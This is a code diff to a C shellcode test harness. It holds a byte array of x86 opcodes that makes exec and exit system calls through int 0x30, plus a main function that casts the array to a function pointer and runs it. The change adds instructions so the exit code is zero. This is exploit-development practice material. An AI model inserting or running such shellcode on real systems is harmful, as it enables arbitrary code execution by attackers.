@@ -14,7 +14,7 @@ char shellcode[] = {
 	"\x52"				   //push edx
 	"\x6A\x02"			   //push 0x2
 	"\xCD\x30"             //int 0x30
-
+	"\x31\xC9\x51"		   //xor ecx,ecx, push ecx
 	"\x6A\x01"			   //push 0x1
 	"\xCD\x30"			   //int 0x30
 }; 
@@ -30,14 +30,14 @@ char shellcode[] = {
 // push   edx - //Push register contents (hex value) onto stack
 // push   0x2 - //Push syscall number
 // int    0x30  - //Interupt executing sys_exec
-
+// xor ecx,ecx. push ecx - //xor'ing both registers loads 0 into ECX then we push 0 as exit code. otherwise 2 incorrect
 // push   0x01 - Pushing exit
 // int    0x30 - Interupt executing sys_exit
 
 int main()
 {
   	printf("Shellcode Main START\n");
-	//Executes any piece of shellcode provided
+	//Injects shellcode into main
   	int (*ret)() = (int(*)())shellcode;
 	ret();
 
